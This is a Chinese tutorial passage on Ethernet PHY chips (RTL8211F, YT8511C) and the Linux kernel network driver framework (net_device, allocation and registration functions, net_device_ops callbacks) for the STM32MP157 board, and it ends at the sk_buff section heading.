+<p><strong>MAC层通过MDIO/MDC总线对PHY进行读写操作，MDIO最多可以控制32个PHY芯片，通过不同的PHY芯片地址来对不同的PHY操作</strong>。RTL8211F通过配置PHYAD[2:0]这三个引脚来设置PHY地址，其中PHYAD2与RXCTL共用一个引脚PHYAD1与RXC共用一个引脚、PHYAD0与RXD3共用一个引脚。可设置的PHY地址范围为：0X001-0X111，如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/08/75/LVHnPcIl_o.png" alt="PHY地址设置"></p> 
+<h4><a id="_197"></a>自动协商</h4> 
+<p>RTL8211F可以开始启动协商功能，将PHYSR寄存器的bit12置1即可使能自动协商，如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/b1/3e/B7cNqZSQ_o.png" alt="使能自动协商"></p> 
+<h4><a id="RGMII_202"></a>RGMII接口电平支持</h4> 
+<p>RTL8211F支持RGMII接口，可以通过CFG_EXT、CFG_LDO0和CFG_LDO1这三个引脚去配置RGMII的电平信号，配置方法如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/de/0d/nzXWfqEE_o.png" alt="RGMII电平信号设置"></p> 
+<p>正点原子V1.2版本之前的核心板CFG_EXT引脚外接3.3V上拉电阻，CFG_LDO0和CFG_LDO1都是接到低了，因此RGMII电压信号为 3.3V。</p> 
+<h4><a id="RTL8211F_208"></a>RTL8211F内部寄存器</h4> 
+<p><strong>RTL8211F的前16个寄存器满足IEEE的要求</strong>，在这里只介绍几个常用的寄存器，首先是<strong>BMCR</strong>(Basic Mode Control Register)寄存器，地址为0，BMCR 寄存器各位如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/3b/46/cYxngbtk_o.png" alt="BMCR寄存器"></p> 
+<p><strong>之前说的配置PHY芯片，重点就是配置BMCR寄存器。</strong></p> 
+<p>接下来看一下<strong>BMSR</strong>(Basic Mode Status Register)寄存器，地址为1。此寄存器为PHY的状态寄存器，<strong>通过此寄存器可以获取到PHY芯片的工作状态</strong>，BMSR寄存器各位如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/0d/b0/H32nMbqo_o.png" alt="BMSR寄存器"></p> 
+<p>从上图中可以看出，不管什么PHY芯片，只要它实现了的位和IEEE规定相符就行。<strong>通过读取BMSR寄存器的值可以得到当前的连接速度、双工状态和连接状态等</strong>。</p> 
+<p>接下来<strong>看一下RTL8211F的PHY ID 1和PHY ID 2这两个寄存器</strong>，这两个寄存器的地址分别为2和3，后面就把这两个寄存器叫做寄存器2和寄存器3。<strong>IEEE规定寄存器2和寄存器3为PHY的ID寄存器，这两个寄存器组成一个32位的唯一ID值</strong>。IEEE规定了一个叫做<strong>OUI的ID组成方式</strong>，全称是Organizationally Unique Identifier，<strong>OUI一共32位，分为三部分：22位的ID+6位厂商型号ID+4位厂商版本ID</strong>，组成如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/83/6e/Mqu9pCYK_o.png" alt="OUI组成方式"></p> 
+<p>RTL8211F的ID寄存器2如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/2d/77/ZDf8ZyR9_o.png" alt="PHY ID寄存器2"></p> 
+<p>ID 寄存器3如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/df/f1/R9ZBFb9R_o.png" alt="PHY ID寄存器3"></p> 
+<p>接着来看一下RTL8211F的<strong>GBCR</strong>(1000Base-T Control Register)寄存器，寄存器地址为0x9；<strong>该寄存器定义了1000Base-T功能的相关控制位</strong>，寄存器描述信息如下所示：</p> 
+<p><img src="https://images2.imgbox.com/2b/ab/muczFQ76_o.png" alt="GBCR寄存器"></p> 
+<p>关于RTL8211F这个PHY就讲解到这里，更加详细的内容大家可以查看RTL8211F对应的参考手册RTL8211F-CG.pdf。</p> 
+<h3><a id="YT8511C_238"></a>YT8511C详解</h3> 
+<p>此小节针对V1.3版本及以后核心板，YT8511C这颗PHY芯片是由苏州裕太车通电子科技有限公司出品的。</p> 
+<p>前面说了，<strong>PHY芯片的前16个寄存器都是一样的，而且只需要使用这前16个寄存器基本就可以驱动起来PHY芯片</strong>。这里就不详细讲解了，YT8511C和RTL8211F区别不大，此章节主<br> 要是讲一下YT8511C的对于RTL8211F差异。</p> 
+<h4><a id="PHY_243"></a>PHY地址设置</h4> 
+<p>YT8511通过PHYADDR[2:0]这三个引脚来确定 PHY芯片地址 ， 其中PHYADDR2-PHYADDR0分别对应LED_AC、RXD1和RXD0这三个引脚，配置如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/2b/0a/THfzJvG6_o.png" alt="YT8511C PHY地址设置"></p> 
+<p>正点原子的STM32MP157开发板上的YT8511的地址为0X00。</p> 
+<h4><a id="_249"></a>低功率模式</h4> 
+<p>YT8511C的低功率模式是由RXD3引脚控制，配置如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/26/1b/F2aGvukC_o.png" alt="YT8511C低功率模式配置"></p> 
+<p>从上图中可以看出来，RXD3为低电平的时候YT8511C进入低功率模式，RXD3为高电平的话YT8511C芯片就为正常功率模式。<strong>正点原子开发板RXD3连接高电平，所以YT8511C芯片为正常功率模式</strong>。</p> 
+<h4><a id="_255"></a>工作模式</h4> 
+<p>YT8511C的LED_1000引脚用来控制工作模式，配置如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/4d/2c/4CM73XrO_o.png" alt="正常模式配置"></p> 
+<p>从上图中可以看出来，LED_1000为低电平的话就进入测试模式，为高电平的话就是正常模式。<strong>正点原子开发板LED_1000连接高电平，所以YT8511C芯片为正常模式</strong>。</p> 
+<h4><a id="RGMII_261"></a>RGMII电压配置</h4> 
+<p>YT8511C的RGMII电压是由RX_DV引脚控制，如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/4f/47/ABiH6Qjo_o.png" alt="RGMII电压配置"></p> 
+<p>从上图可以看出如果RX_DV为低电平的时候RGMII电平为3.3V，RX_DV为高电平的时候RGMII电平为2.5V。<strong>正点原子开发板RX_DV连接低电平，所以YT8511C的引脚电平为3.3V</strong>。</p> 
+<h4><a id="125M_267"></a>125M时钟使能</h4> 
+<p><strong>STM32MP157千M网络工作的时候需要和PHY之间有一个125MHz的时钟</strong>，在这里YT8511C提供这个125MHz的时钟。但是默认情况下，YT8511C这个125MHz时钟没有使能，所以<strong>需要配置寄存器，使能这个125MHz</strong>。这里<strong>需要用到YT8511C的时钟控制寄存器，这是个扩展寄存器，地址为0X0C，这个寄存器是YT8511C官方自定义的</strong>，不属于IEEE规定的寄存器。<strong>时钟控制寄存器的bit2和bit1用于设置时钟输入</strong>，如下图所示：</p> 
+<p><img src="https://images2.imgbox.com/0b/fa/oYtmxpwr_o.png" alt="时钟控制寄存器"></p> 
+<p>从上图可以看出，当bit2:1为11的时候，输出125M时钟。</p> 
+<p>芯片YT8511C还有很多设置，这边就不一一列出了，可以直接查看芯片原理图就知道了。</p> 
+<h2><a id="Linux_275"></a>Linux内核网络驱动框架</h2> 
+<h3><a id="net_device_276"></a>net_device结构体</h3> 
+<p><strong>Linux内核使用net_device结构体表示一个具体的网络设备</strong>，net_device是整个网络驱动的灵魂。网络驱动的核心就是<strong>初始化net_device结构体中的各个成员变量，然后将初始化完成以后的net_device注册到Linux内核中</strong>。net_device结构体定义在include/linux/netdevice.h中，net_device是一个庞大的结构体，内容如下(有缩减)：</p> 
+<pre><code class="prism language-c">示例代码 <span class="token number">52.3</span><span class="token number">.1</span><span class="token number">.1</span> net_device 结构体
+<span class="token number">1783</span> <span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token punctuation">{<!-- --></span>
+<span class="token number">1784</span>     <span class="token keyword">char</span> name<span class="token punctuation">[</span>IFNAMSIZ<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token number">1785</span>     <span class="token keyword">struct</span> <span class="token class-name">hlist_node</span> name_hlist<span class="token punctuation">;</span>
+<span class="token number">1786</span>     <span class="token keyword">struct</span> <span class="token class-name">dev_ifalias</span> __rcu <span class="token operator">*</span>ifalias<span class="token punctuation">;</span>
+<span class="token number">1787</span>     <span class="token comment">/*
+1788      * I/O specific fields
+1789      * FIXME: Merge these and struct ifmap into one
+1790      */</span>
+<span class="token number">1791</span>     <span class="token keyword">unsigned</span> <span class="token keyword">long</span> mem_end<span class="token punctuation">;</span>
+<span class="token number">1792</span>     <span class="token keyword">unsigned</span> <span class="token keyword">long</span> mem_start<span class="token punctuation">;</span>
+<span class="token number">1793</span>     <span class="token keyword">unsigned</span> <span class="token keyword">long</span> base_addr<span class="token punctuation">;</span>
+<span class="token number">1794</span>     <span class="token keyword">int</span> irq<span class="token punctuation">;</span>
+<span class="token number">1795</span>
+<span class="token number">1796</span>     <span class="token comment">/*
+1797      * Some hardware also needs these fields (state,dev_list,
+1798      * napi_list,unreg_list,close_list) but they are not
+1799      * part of the usual set specified in Space.c.
+1800      */</span>
+<span class="token number">1801</span>
+<span class="token number">1802</span>     <span class="token keyword">unsigned</span> <span class="token keyword">long</span> state<span class="token punctuation">;</span>
+<span class="token number">1803</span>
+<span class="token number">1804</span>     <span class="token keyword">struct</span> <span class="token class-name">list_head</span> dev_list<span class="token punctuation">;</span>
+<span class="token number">1805</span>     <span class="token keyword">struct</span> <span class="token class-name">list_head</span> napi_list<span class="token punctuation">;</span>
+<span class="token number">1806</span>     <span class="token keyword">struct</span> <span class="token class-name">list_head</span> unreg_list<span class="token punctuation">;</span>
+<span class="token number">1807</span>     <span class="token keyword">struct</span> <span class="token class-name">list_head</span> close_list<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">1841</span>     <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">net_device_ops</span> <span class="token operator">*</span>netdev_ops<span class="token punctuation">;</span>
+<span class="token number">1842</span>     <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">ethtool_ops</span> <span class="token operator">*</span>ethtool_ops<span class="token punctuation">;</span>
+<span class="token number">1843</span> #ifdef CONFIG_NET_L3_MASTER_DEV
+<span class="token number">1844</span>     <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">l3mdev_ops</span> <span class="token operator">*</span>l3mdev_ops<span class="token punctuation">;</span>
+<span class="token number">1845</span> #endif
+<span class="token number">1846</span> #<span class="token keyword">if</span> <span class="token function">IS_ENABLED</span><span class="token punctuation">(</span>CONFIG_IPV6<span class="token punctuation">)</span>
+<span class="token number">1847</span>     <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">ndisc_ops</span> <span class="token operator">*</span>ndisc_ops<span class="token punctuation">;</span>
+<span class="token number">1848</span> #endif
+<span class="token number">1849</span>
+<span class="token number">1850</span> #ifdef CONFIG_XFRM_OFFLOAD
+<span class="token number">1851</span>     <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">xfrmdev_ops</span> <span class="token operator">*</span>xfrmdev_ops<span class="token punctuation">;</span>
+<span class="token number">1852</span> #endif
+<span class="token number">1853</span>
+<span class="token number">1854</span> #<span class="token keyword">if</span> <span class="token function">IS_ENABLED</span><span class="token punctuation">(</span>CONFIG_TLS_DEVICE<span class="token punctuation">)</span>
+<span class="token number">1855</span>     <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">tlsdev_ops</span> <span class="token operator">*</span>tlsdev_ops<span class="token punctuation">;</span>
+<span class="token number">1856</span> #endif
+<span class="token number">1857</span>
+<span class="token number">1858</span>     <span class="token keyword">const</span> <span class="token keyword">struct</span> <span class="token class-name">header_ops</span> <span class="token operator">*</span>header_ops<span class="token punctuation">;</span>
+<span class="token number">1859</span>
+<span class="token number">1860</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> flags<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">1869</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> if_port<span class="token punctuation">;</span>
+<span class="token number">1870</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> dma<span class="token punctuation">;</span>
+<span class="token number">1871</span>
+<span class="token number">1872</span>     <span class="token comment">/* Note : dev-&gt;mtu is often read without holding a lock.
+1873      * Writers usually hold RTNL.
+1874      * It is recommended to use READ_ONCE() to annotate the 
+1875      * reads, and to use WRITE_ONCE() to annotate the writes.
+1876      */</span>
+<span class="token number">1877</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> mtu<span class="token punctuation">;</span>
+<span class="token number">1878</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> min_mtu<span class="token punctuation">;</span>
+<span class="token number">1879</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> max_mtu<span class="token punctuation">;</span>
+<span class="token number">1880</span>     <span class="token keyword">unsigned</span> <span class="token keyword">short</span> type<span class="token punctuation">;</span>
+<span class="token number">1881</span>     <span class="token keyword">unsigned</span> <span class="token keyword">short</span> hard_header_len<span class="token punctuation">;</span>
+<span class="token number">1882</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> min_header_len<span class="token punctuation">;</span>
+<span class="token number">1883</span>
+<span class="token number">1884</span>     <span class="token keyword">unsigned</span> <span class="token keyword">short</span> needed_headroom<span class="token punctuation">;</span>
+<span class="token number">1885</span>     <span class="token keyword">unsigned</span> <span class="token keyword">short</span> needed_tailroom<span class="token punctuation">;</span>
+<span class="token number">1886</span>
+<span class="token number">1887</span>     <span class="token comment">/* Interface address info. */</span>
+<span class="token number">1888</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> perm_addr<span class="token punctuation">[</span>MAX_ADDR_LEN<span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token number">1889</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> addr_assign_type<span class="token punctuation">;</span>
+<span class="token number">1890</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> addr_len<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">1938</span>     <span class="token comment">/*
+1939      * Cache lines mostly used on receive path (including 
+1940     eth_type_trans()) */</span>
+<span class="token number">1941</span>     <span class="token comment">/* Interface address info used in eth_type_trans() */</span>
+<span class="token number">1942</span>     <span class="token keyword">unsigned</span> <span class="token keyword">char</span> <span class="token operator">*</span>dev_addr<span class="token punctuation">;</span>
+<span class="token number">1943</span>
+<span class="token number">1944</span>     <span class="token keyword">struct</span> <span class="token class-name">netdev_rx_queue</span> <span class="token operator">*</span>_rx<span class="token punctuation">;</span>
+<span class="token number">1945</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_rx_queues<span class="token punctuation">;</span>
+<span class="token number">1946</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> real_num_rx_queues<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">1967</span>     <span class="token comment">/*
+1968      * Cache lines mostly used on transmit path
+1969      */</span>
+<span class="token number">1970</span>     <span class="token keyword">struct</span> <span class="token class-name">netdev_queue</span> <span class="token operator">*</span>_tx ____cacheline_aligned_in_smp<span class="token punctuation">;</span>
+<span class="token number">1971</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> num_tx_queues<span class="token punctuation">;</span>
+<span class="token number">1972</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> real_num_tx_queues<span class="token punctuation">;</span>
+<span class="token number">1973</span>     <span class="token keyword">struct</span> <span class="token class-name">Qdisc</span> <span class="token operator">*</span>qdisc<span class="token punctuation">;</span>
+<span class="token number">1974</span> #ifdef CONFIG_NET_SCHED
+<span class="token number">1975</span>     <span class="token function">DECLARE_HASHTABLE</span> <span class="token punctuation">(</span>qdisc_hash<span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token number">1976</span> #endif
+<span class="token number">1977</span>     <span class="token keyword">unsigned</span> <span class="token keyword">int</span> tx_queue_len<span class="token punctuation">;</span>
+<span class="token number">1978</span>     <span class="token class-name">spinlock_t</span> tx_global_lock<span class="token punctuation">;</span>
+<span class="token number">1979</span>     <span class="token keyword">int</span> watchdog_timeo<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">2061</span>     <span class="token keyword">struct</span> <span class="token class-name">phy_device</span> <span class="token operator">*</span>phydev<span class="token punctuation">;</span>
+<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+<span class="token number">2069</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
+</code></pre> 
+<p>下面介绍一些关键的成员变量，如下：</p> 
+<p>第1784行：name是网络设备的名字。</p> 
+<p>第1791行：mem_end是共享内存结束地址。</p> 
+<p>第1792行：mem_start是共享内存起始地址。</p> 
+<p>第1793行：base_addr是网络设备I/O地址。</p> 
+<p>第1794行：irq是网络设备的中断号。</p> 
+<p>第1804行：dev_list是全局网络设备列表。</p> 
+<p>第1805行：napi_list是napi网络设备的列表入口。</p> 
+<p>第1806行：unreg_list是注销(unregister)的网络设备列表入口。</p> 
+<p>第1807行：close_list是关闭的网络设备列表入口。</p> 
+<p>第1841行：netdev_ops是网络设备的操作集函数，包含了一系列的网络设备操作回调函数，<br> 类似字符设备中的file_operations，稍后会讲解netdev_ops结构体。</p> 
+<p>第1842行：ethtool_ops是网络管理工具相关函数集，用户空间网络管理工具会调用此结构体中的相关函数获取网卡状态或者配置网卡。</p> 
+<p>第1858行：header_ops是头部的相关操作函数集，比如创建、解析、缓冲等。</p> 
+<p>第1860行：flags是网络接口标志，标志类型定义在include/uapi/linux/if.h文件中，为一个枚举类型，内容如下：</p> 
+<p><img src="https://images2.imgbox.com/90/60/2LFDjMg8_o.png" alt="网络标志类型flags"></p> 
+<p>继续回到示例代码52.3.1.1中，接着看net_device结构体。</p> 
+<p>第1869行：if_port指定接口的端口类型，如果设备支持多端口的话就通过if_port来指定所使用的端口类型。可选的端口类型定义在include/uapi/linux/netdevice.h中，为一个枚举类型，如下所示：</p> 
+<p><img src="https://images2.imgbox.com/b2/dd/3S5mCYs7_o.png" alt="端口类型if_port"></p> 
+<p>第1870行：dma是网络设备所使用的DMA通道，不是所有的设备都会用到DMA。</p> 
+<p>第1877行：mtu是网络最大传输单元，为1500。</p> 
+<p>第1880行：type用于指定ARP模块的类型，以太网的ARP接口为ARPHRD_ETHER，Linux内核所支持的ARP协议定义在include/uapi/linux/if_arp.h中，可以自行查阅。</p> 
+<p>第1888行：perm_addr是永久的硬件地址，如果某个网卡设备有永久的硬件地址，那么就会填充perm_addr。</p> 
+<p>第1890行：addr_len是硬件地址长度。</p> 
+<p>第1942行：dev_addr也是硬件地址，是当前分配的MAC地址，可以通过软件修改。</p> 
+<p>第1944行：_rx是接收队列。</p> 
+<p>第1945行：num_rx_queues是接收队列数量，在调用register_netdev注册网络设备的时候会分配指定数量的接收队列。</p> 
+<p>第1946行：real_num_rx_queues是当前活动的队列数量。</p> 
+<p>第1970行：_tx是发送队列。</p> 
+<p>第1971行：num_tx_queues是发送队列数量，通过alloc_netdev_mq函数分配指定数量的发送队列。</p> 
+<p>第1972行：real_num_tx_queues是当前有效的发送队列数量。</p> 
+<p>第2061行：phydev是对应的PHY设备。</p> 
+<h4><a id="net_device_441"></a>申请net_device</h4> 
+<p><strong>编写网络驱动的时候首先要申请net_device，使用alloc_netdev函数来申请net_device</strong>，这<br> 是一个宏，宏定义如下：</p> 
+<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">alloc_netdev</span><span class="token expression"><span class="token punctuation">(</span>sizeof_priv<span class="token punctuation">,</span> name<span class="token punctuation">,</span> name_assign_type<span class="token punctuation">,</span> setup<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
+ 	<span class="token expression"><span class="token function">alloc_netdev_mqs</span><span class="token punctuation">(</span>sizeof_priv<span class="token punctuation">,</span> name<span class="token punctuation">,</span> name_assign_type<span class="token punctuation">,</span> setup<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span></span></span>
+</code></pre> 
+<p>可以看出alloc_netdev的<strong>本质是alloc_netdev_mqs 函数</strong>，此函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span><span class="token function">alloc_netdev_mqs</span><span class="token punctuation">(</span><span class="token keyword">int</span> sizeof_priv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">,</span>
+						<span class="token keyword">unsigned</span> <span class="token keyword">char</span> name_assign_type<span class="token punctuation">,</span>
+						<span class="token keyword">void</span> <span class="token punctuation">(</span><span class="token operator">*</span>setup<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+						<span class="token keyword">unsigned</span> <span class="token keyword">int</span> txqs<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> rxqs<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>sizeof_priv：私有数据块大小。</li><li>name：设备名字。</li><li>name_assign_type：设备名字的来源。</li><li>setup：回调函数，初始化设备的设备后调用此函数。</li><li>txqs：分配的发送队列数量。</li><li>rxqs：分配的接收队列数量。</li><li>返回值：如果申请成功的话就返回申请到的net_device指针，失败的话就返回NULL。</li></ul> 
+<p>事实上网络设备有多种，不要以为就只有以太网一种。<strong>Linux内核支持的网络接口有很多</strong>，比如光纤分布式数据接口(FDDI)、以太网设备(Ethernet)、红外数据接口(InDA)、高性能并行接口(HPPI)、CAN网络等。内核针对不同的网络设备在alloc_netdev的基础上提供了一层封装，比如本章讲解的以太网，<strong>针对以太网封装的net_device申请函数是alloc_etherdev和alloc_etherdev_mq，这也是一个宏</strong>，内容如下：</p> 
+<pre><code class="prism language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">alloc_etherdev</span><span class="token expression"><span class="token punctuation">(</span>sizeof_priv<span class="token punctuation">)</span> <span class="token function">alloc_etherdev_mq</span><span class="token punctuation">(</span>sizeof_priv<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">alloc_etherdev_mq</span><span class="token expression"><span class="token punctuation">(</span>sizeof_priv<span class="token punctuation">,</span> count<span class="token punctuation">)</span> <span class="token function">alloc_etherdev_mqs</span><span class="token punctuation">(</span>sizeof_priv<span class="token punctuation">,</span> count<span class="token punctuation">,</span> count<span class="token punctuation">)</span></span></span>
+</code></pre> 
+<p>可以看出，<strong>alloc_etherdev最终依靠的是alloc_etherdev_mqs函数 ，此函数就是对alloc_netdev_mqs的简单封装</strong>，函数内容如下：</p> 
+<p><img src="https://images2.imgbox.com/bb/f4/5j1kfTuH_o.png" alt="alloc_etherdev_mqs函数"></p> 
+<p>第414行调用alloc_netdev_mqs来申请net_device，注意这里<strong>设置网卡的名字为“eth%d”，这是格式化字符串，大家进入开发板的linux系统以后看到的“eth0”、“eth1”这样的网卡名字就是从这里来的</strong>。同样的，这里<strong>设置了以太网的setup函数为ether_setup，不同的网络设备其setup函数不同</strong>，比如CAN网络里面setup函数就是can_setup。</p> 
+<p><strong>ether_setup函数会对net_device做初步的初始化</strong>，函数内容如下所示：</p> 
+<p><img src="https://images2.imgbox.com/04/3a/MHFVaM9N_o.png" alt="ether_setup函数"></p> 
+<p>关于net_device的申请就讲解到这里，对于网络设备而言，<strong>使用alloc_etherdev或alloc_etherdev_mqs来申请net_device。ST官方编写的网络驱动就是采用alloc_etherdev_mqs来申请net_device</strong>。</p> 
+<h4><a id="net_device_483"></a>删除net_device</h4> 
+<p>当注销网络驱动的时候需要<strong>释放掉前面已经申请到的net_device，释放函数为free_netdev</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">free_netdev</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>dev：要释放掉的net_device指针。</li><li>返回值：无。</li></ul> 
+<h4><a id="net_device_492"></a>注册net_device</h4> 
+<p><strong>net_device申请并初始化完成以后就需要向内核注册net_device，要用到函数register_netdev</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">int</span> <span class="token function">register_netdev</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>dev：要注册的net_device指针。</li><li>返回值：0，注册成功；负值，注册失败。</li></ul> 
+<h4><a id="net_device_501"></a>注销net_device</h4> 
+<p>既然有注册，那么必然有注销，<strong>注销net_device 使用函数unregister_netdev</strong>，函数原型如下：</p> 
+<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token function">unregister_netdev</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">net_device</span> <span class="token operator">*</span>dev<span class="token punctuation">)</span>
+</code></pre> 
+<p>函数参数和返回值含义如下：</p> 
+<ul><li>dev：要注销的net_device指针。</li><li>返回值：无。</li></ul> 
+<h3><a id="net_device_ops_510"></a>net_device_ops结构体</h3> 
+<p><strong>net_device有个非常重要的成员变量netdev_ops，为net_device_ops结构体指针类型，这就是网络设备的操作集</strong>。net_device_ops结构体定义在include/linux/netdevice.h文件中，net_device_ops结构体里面<strong>都是一些以“ndo_”开头的函数，这些函数就需要网络驱动编写人员去实现，不需要全部都实现，根据实际驱动情况实现其中一部分即可</strong>。结构体内容如下所示(结<br> 构体成员变量比较多，这里有缩减)：</p> 
+<p><img src="https://images2.imgbox.com/ee/78/FTKtDmSP_o.png" alt="net_device_ops结构体内容"></p> 
+<p>第1250行：<strong>ndo_init函数，当第一次注册网络设备的时候此函数会执行</strong>，设备可以在此函数中做一些需要推后初始化的内容，不过<strong>一般驱动中不使用此函数，虚拟网络设备可能会使用</strong>。</p> 
+<p>第1251行：<strong>ndo_uninit函数，卸载网络设备的时候此函数会执行</strong>。</p> 
+<p>第1252行：<strong>ndo_open函数，打开网络设备的时候此函数会执行，网络驱动程序需要实现此函数，非常重要</strong>！以STM32MP1系列SoC网络驱动为例会在此函数中做如下工作：</p> 
+<ul><li>初始化接收缓冲区。</li><li>如果使用NAPI的话要使能NAPI模块，通过napi_enable函数来使能。</li><li>STM32MP1 MAC控制器硬件相关初始化。</li><li>开启PHY。</li><li>调用netif_tx_start_all_queues来使能传输队列，也可能调用netif_start_queue函数。</li><li>……</li></ul> 
+<p>第1253行：<strong>ndo_stop函数，关闭网络设备的时候此函数会执行，网络驱动程序也需要实现此函数</strong>。以STM32MP1系列SoC网络驱动为例，会在此函数中做如下工作：</p> 
+<ul><li>停止PHY。</li><li>停止NAPI功能。</li><li>停止发送功能。</li><li>关闭MAC。</li><li>断开PHY连接。</li><li>释放数据缓冲区。</li><li>……</li></ul> 
+<p>第1254行：<strong>ndo_start_xmit函数，当需要发送数据的时候此函数就会执行，此函数有一个参数为sk_buff结构体指针</strong>，sk_buff结构体在Linux的网络驱动中非常重要，<strong>sk_buff保存了上层传递给网络驱动层的数据</strong>。也就是说，要发送出去的数据都存在了sk_buff中，关于sk_buff稍后会做详细的讲解。如果发送成功的话此函数返回NETDEV_TX_OK，如果发送失败了就返回NETDEV_TX_BUSY，如果发送失败了就需要停止队列。</p> 
+<p>第1259行：do_select_queue函数，当设备支持多传输队列的时候选择使用哪个队列。</p> 
+<p>第1264行：ndo_set_rx_mode函数，此函数用于改变地址过滤列表，根据net_device的flags成员变量来设置SoC的网络外设寄存器。比如flags可能为IFF_PROMISC、IFF_ALLMULTI或IFF_MULTICAST，分别表示混杂模式、单播模式或多播模式。</p> 
+<p>第1265行：<strong>ndo_set_mac_address函数，此函数用于修改网卡的MAC地址</strong>，设置net_device的dev_addr成员变量，并且将MAC地址写入到网络外设的硬件寄存器中。</p> 
+<p>第1267行：<strong>ndo_validate_addr函数，验证MAC地址是否合法</strong>，也即是验证net_devic的dev_addr中的MAC地址是否合法，直接调用is_valid_ether_addr函数。</p> 
+<p>第1268行：<strong>ndo_do_ioctl函数，用户程序调用ioctl的时候此函数就会执行</strong>，比如PHY芯片相关的命令操作，一般会直接调用phy_mii_ioctl函数。</p> 
+<p>第1272行：ndo_change_mtu函数，更改MTU大小。</p> 
+<p>第1276行：ndo_tx_timeout函数，当发送超时的时候产生会执行，一般都是网络出问题了导致发送超时。一般可能会重启MAC和PHY，重新开始数据发送等。</p> 
+<p>第1291行：ndo_poll_controller函数，使用查询方式来处理网卡数据的收发。</p> 
+<p>第1368行：ndo_set_features函数，修改net_device的features属性，设置相应的硬件属性。</p> 
+<h3><a id="sk_buff_556"></a>sk_buff结构体</h3> 
